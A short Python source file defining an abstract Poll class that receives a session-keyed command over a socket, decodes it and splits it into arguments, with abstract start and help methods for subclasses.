#!/usr/bin/env python3

from venomsrc.utils import Utils
from venomsrc.colored import Colors
from abc import ABC, abstractmethod
from socket import socket
import venomsrc.globals

class Poll(ABC):
    def __init__(self, writer: socket, reader: socket, sess_key: str):
        self.utils = Utils()
        self.colors = Colors()
        venomsrc.globals.init()
        self.writer = writer
        self.reader = reader
        self.sess_key = sess_key

    async def poll_cmdreceive(self):
        try:
            command = await self.utils.srecv(self.reader, self.sess_key)
            if not command:
                self.utils.log(self.utils.WARNING, 'cmd_poll(): CMD receive error', 1)
                return False, False, False, False

        except Exception as e:
            print(e)
            return False, False, False, False

        try:
            command = command.decode('utf-8')
        except UnicodeDecodeError:
            return "UnicodeError", command, False, False
        except Exception:
            return False, False, False, False

        argv = command.split()  # command splited
        argc = len(argv)  # total len
        cmd = argv[0]

        return command, argv, argc, cmd

    @abstractmethod
    async def start(self):
        """
        start bucle
        """
        pass

    @abstractmethod
    def help_cmd(self) -> str:
        """
        Prompt help
        """
        pass